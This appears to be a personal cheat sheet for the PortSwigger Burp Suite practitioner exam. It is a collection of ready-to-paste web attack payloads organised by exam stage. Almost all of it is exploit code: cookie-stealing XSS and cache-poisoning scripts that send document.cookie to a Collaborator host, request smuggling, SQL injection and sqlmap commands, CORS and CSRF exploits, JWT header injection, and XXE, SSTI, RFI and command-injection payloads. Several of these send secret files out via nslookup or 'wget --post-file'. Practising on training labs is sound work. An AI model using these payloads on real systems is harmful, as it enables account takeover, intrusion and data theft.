## Stage 1
### Host Header Poison (Forgot-Password)

The best place, where you can set this type of attacks is in **Forgot password?** functionality.  
[![image](https://user-images.githubusercontent.com/58632878/225040952-cf621879-c6e9-4b9d-aac8-b1b3c3d95bf4.png)](https://user-images.githubusercontent.com/58632878/225040952-cf621879-c6e9-4b9d-aac8-b1b3c3d95bf4.png)

Set your exploit server in Host and change username to victim's one:  
[![image](https://user-images.githubusercontent.com/58632878/225041836-87faa37d-39f9-48c5-910f-aed9be30f63a.png)](https://user-images.githubusercontent.com/58632878/225041836-87faa37d-39f9-48c5-910f-aed9be30f63a.png)

Go to exploit server logs and find victim's forgot-password-token:  
[![image](https://user-images.githubusercontent.com/58632878/225043063-d2db3e7a-f23d-40cb-955e-76e282be65f1.png)](https://user-images.githubusercontent.com/58632878/225043063-d2db3e7a-f23d-40cb-955e-76e282be65f1.png)

These Headers can also be used, when **Host** does not work:

```
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
```

### Web Cache Poisoning with an unkeyed header (tracking.js)

The main tip I've got there is to watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response. If you got only tracking.js without X-Cache - no cache poisoning here, folks.  
[![image](https://user-images.githubusercontent.com/58632878/225033745-33636739-0101-422f-a9b7-bf125f55201f.png)](https://user-images.githubusercontent.com/58632878/225033745-33636739-0101-422f-a9b7-bf125f55201f.png)

If you got both file and header, the first thing you should try is to inject your exploit server into **Host:** or **X-Forwarded-Host:** headers and check them in response:  
[![image](https://user-images.githubusercontent.com/58632878/225035542-13e03e9b-b1b7-4be8-8db0-a10a340e33dd.png)](https://user-images.githubusercontent.com/58632878/225035542-13e03e9b-b1b7-4be8-8db0-a10a340e33dd.png)

**ATTENTION:** It is really important to send your poisoned request more than once. For me, I had to send it like 10 times to poison the cache.

You got the poisoned cache with X-Forwarded-Host? Cool, now go to your exploit server, set the File name /resources/js/tracking.js and in Body section paste the next payload: `document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')`. Poison web cache with your server and wait for victim's cookies.  
[![image](https://user-images.githubusercontent.com/58632878/225039388-6cb922d5-2a22-4f00-a886-b14a5435c7ef.png)](https://user-images.githubusercontent.com/58632878/225039388-6cb922d5-2a22-4f00-a886-b14a5435c7ef.png)
### Identify valid user accounts with password reset function

![](https://py-us3r.github.io/img2/Pasted%20image%2020251112225244.png) ![](https://py-us3r.github.io/img2/Pasted%20image%2020251112225317.png)

> By using the user dictionary provided by PortSwigger, you find another valid user besides Carlos; in my case, it was the user root.

> Once we identify the new user “root”, all that remains is to perform brute force using the password dictionary provided by PortSwigger.

### HTTP Request Smuggling (XSS via User-Agent)

```
- TE.CL with " bypass- 

POST / HTTP/1.1

Content-Length: 5
Transfer-Encoding: "chunked"

330
GET /post?postId=4 HTTP/1.1
Host: 0a1100de03dee2f980d72b9b007c00d6.web-security-academy.net
User-Agent: a"/><script>document.location='http://<BURP-COLLABORATOR>/?c='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Cookie: <COOKIE>

x=1
0

```

```
- CL.TE -

POST / HTTP/1.1

Transfer-Encoding: chunked
Transfer-Encoding: ORHFSuL
Content-Length: 25

f
du60v=x&h94ed=x
0

GET /post?postId=1 HTTP/1.1
Host: <CHANGE>
User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://<BURP-COLLABORATOR>?cookie="+document.cookie);x.send();</script>
Cookie: <COOKIE>
```

### XSS Reflected (search-term)

```
GET /?search-term="><script>alert(1)</script>

"Tag is not allowed"
```

![](https://py-us3r.github.io/img2/Pasted%20image%2020251112225926.png) ![](https://py-us3r.github.io/img2/Pasted%20image%2020251112225950.png)

```
<iframe src="https://<EXAM URL>/?searchterm='<body onload=%22eval(atob('<BASE64 ENCODE>'))%22>//" onload="this.onload=";this.src ='#XSS'"></iframe>
```

```
<iframe src="https://<EXAM URL>/?searchterm=%22%3E%3Cbody%20onload=%22document.location%22%5D%3D%22https%3A%2F%2F<BUPR-COLLABORATOR/?c='+document.cookie"%22%3E//>">
```

## Stage 2
### JSON Role ID update (update-email)

```
POST /update-email


{
	"email":"test@test.com",
	"roleid":$0$
}
```

### SQL Injection (advanced_search)

```
GET /search_advanced?search_term=INJECTION'&sortby=AUTHOR&blog_artist=Ben+Eleven
```

```
GET /search_advanced?search_term=a'))--&sortby&blog_artist=
```

```
GET /search_advanced?search_term=a')) union select NULL,'aaaa',username||'-'||password,NULL,NULL,NULL,NULL from users--&sortby=&blog_artist=
```

```
python3 sqlmap.py -u "https://<EXAM URL>/advancedsearch?search-term=a&sort=AUTHOR%27&creator=Sam+Pit" --cookie='<COOKIE>' --risk 3 --level 3 --sql-query "SELECT password FROM users WHERE username='administrator'"
```

> Whenever you see an advanced search section, it is very likely—or almost certain—that it is a SQL injection. This is a free stage.

### CORS AJAX Account API and session cookie from admin

> In this case, I am not 100% sure which example appears in the exam; however, I have some notes I made, and it is likely that the exam will include something similar.

> Origin allow Subdomains + XSS

```
- XSS ON CHECK STOCK-

https://stock.[LAB_URL]/?productId=<script>alert(1)</script>&storeId=2
```

```
- ORIGINAL PAYLOAD -

<script>
var req = new XMLHttpRequest();

req.onload=sendAPI;
req.withCredentials = true;
req.open('GET','https://[LAB_URL]/accountDetails',true);
req.send();

function sendAPI(){
  location='https://[BURP_COLLABORATOR]?api='+btoa(req.responseText);
};
</script>
```

```
- FINAL INJECTION -

<script>
  location="http://stock.[LAB_URL]/?productId=%3cscript>var req = new XMLHttpRequest();req.onload=sendAPI;req.withCredentials = true;req.open('GET','https://[LAB_URL]/accountDetails',true);req.send();function sendAPI(){  location='https://[BURP_COLLABORATOR]?api='%2Bbtoa(req.responseText);};%3c/script>&storeId=5"
</script>
```

> Null Origin

```
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload= sendAPI;
req.withCredentials = true;
req.open('GET','https://[LAB_URL]/accountDetails',true);
req.send();
function sendAPI() {
  location='https://[BURP_COLLABORATOR]?api='+btoa(req.responseText);
};
</script>"</iframe>
```

### CSRF Refresh Password (COOKIE -> isloggedin : true)

> Whenever you see this cookie, you will get this example in the exam.

```
- COOKIE -
  
%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MC4CFQCWIzg8mjbac41XpWZLvL6cUxKYoQIVAISSvLwmd%2bj0AlQAjLzHFc3ny6L4
```

![](https://py-us3r.github.io/img2/Pasted%20image%2020251112231533.png)

```
POST /refreshpassword

Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MC4CFQCWIzg8mjbac41XpWZLvL6cUxKYoQIVAISSvLwmd%2bj0AlQAjLzHFc3ny6L4
X-Forwarded-Host: <exploit-server>.web-security-academy.net
X-Host: <exploit-server>.web-security-academy.net
X-Forwarded-Server: <exploit-server>.web-security-academy.net

csrf=<CARLOS CSRF>&username=administrator
```

### CSRF change email admin formid

We identified it thanks to the fact that the request allows changing the email by removing the CSRF token.

```
- EXPLOIT SERVER -
  

<html>
<meta name="referrer" content="no-referrer">
  <body>
    <form action="https://[LAB_URL]/my_account/changeemail" method="POST">
      <input type="hidden" name="email" value="attacker@exploitservermail.com" />
      <input type="hidden" name="form&#45;id" value="HfWYqd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

> You’ll see that when you try to execute the CSRF, the server responds with an error in the Referer. To bypass it, you need to remove the Referer header using the tag. This vulnerability is the same as in this lab → https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

> Once the victim’s password has been changed, we send a ‘forgot password’ request to our own email.

### JWT

> I have not found any exam example for this vulnerability; however, there are not many possible variants, so one of these examples will most likely appear.

> JWK Header Injection

![](https://py-us3r.github.io/img2/Pasted%20image%2020250924135953.png) ![](https://py-us3r.github.io/img2/Pasted%20image%2020250924140042.png)

> JKU Header Injection

```
- IDENTIFY -

{  
    "jku": "https://DOMAIN/",  
    "kid": "d593b25a-b459-49a9-8fb2-7b540a5a4526",  
    "alg": "RS256"  
}
```

![](https://py-us3r.github.io/img2/Pasted%20image%2020250924143418.png) ![](https://py-us3r.github.io/img2/Pasted%20image%2020250924143347.png)

```
- EXPLOIT SERVER -

- COPY KID -

{
  "keys": [
    {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "d593b25a-b459-49a9-8fb2-7b540a5a4526",
    "n": "woquDsRECLVJGh2sANmjEh0cvfe0Wydmndld7KkOi5x4UZvV2MFeIRebtLDTJf-vp8i6SY0scmLSyDt1vwcNEg_VisFlIlPenBKBdxNyIKcRwABkyQEwe_TNpCAAqilAxPrDTyEswGii1hGChLlFoSU2WHZ2Kxts1FXCQOz1iuhm5Fg-KHiaAlKmAlG2lp83iNbYtSvnnL4L58ZjvXiNGABSVF-6_juM2uAjCKEOMzOw9dELTxFXSHEJLoJqx2wFsTLrBOQgKQbJ1j6PlfXAn99RposH4VSeXYfxJ7s1fozclcxke4uEHKNEz4rT9OlLj0e0STjfbNw4BMXMn55_jw"
}
  ]
}
```

![](https://py-us3r.github.io/img2/Pasted%20image%2020250924143802.png)

> KID Path Traversal (NULL BYTE)

```
❯ echo -n "\0" | base64
```

```
AA==
```

![](https://py-us3r.github.io/img2/Pasted%20image%2020250924164632.png) ![](https://py-us3r.github.io/img2/Pasted%20image%2020250924164737.png)
## Stage 3
### XXE admin user import

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %xxe SYSTEM "https://<exploit-server>.web-security-academy.net/exploit.dtd">%xxe;]>
  <users>
    <user>
      <username>Example1</username>
      <email>example1@domain.com</email>
    </user>
    <user>
      <username>&xxe;</username>
      <email>example2@domain.com</email>
    </user>
  </users>
```

```dtd
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<BURP-COLABORATOR>/?x=%file;'>"

%eval;
%exfil;
```

### OS Command Injection inside XML admin user import

```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).BURP-COLLABORATOR`</email>
    </user>
</users>
```

### Admin Panel Download report as PDF SSRF

```
{
  "table-html":"<div><p>Report Heading</p><iframe src='http://localhost:6566/home/carlos/secret'>"
}
```

### File Path Traversal (admin_img)

> I have seen many reviews saying that the word ‘secret’ is blocked, but it can be bypassed with URL encoding.

```
GET /adminpanel/admin_img?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome/carlos/%252537%33%2536%2536%2533%2537%32%2536%35%2537%34
```

> Me modified
```
GET /adminpanel/admin_img?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome/carlos/%252537%33%2536%35%2536%2533%2537%32%2536%35%2537%34
```

> Another
```
/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

### admin_panel Config the password reset email template SSTI

> Jinja2

[![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)

```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

### Upload image from URL RFI (admin panel)

![](https://py-us3r.github.io/img2/Pasted%20image%2020251116121321.png)

```
EXPLOIT SERVER

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```
https://exploit-server.com/shell.php#kek.jpg
```

### Admin Panel ImgSize command injection

```
/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
Or  
ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
```
